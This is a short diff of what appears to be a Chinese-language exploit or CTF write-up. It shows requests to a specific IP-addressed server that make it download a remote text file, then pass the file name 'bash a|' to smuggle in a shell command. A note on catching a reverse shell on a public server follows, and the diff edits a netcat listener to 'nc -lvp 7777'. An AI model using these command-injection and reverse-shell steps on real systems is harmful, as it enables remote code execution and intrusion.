@@ -37,7 +37,7 @@ http://117.50.3.97:8004/?url=http://ipv4.ssssdl.xyz/aa.txt&filename=a
 写入bash a|文件，相当于例子中的touch id|
 http://117.50.3.97:8004/?url=&filename=bash a|
 公网服务器监听端口反弹shell
-nc -lv
+nc -lvp 7777
 命令执行
 ```
 
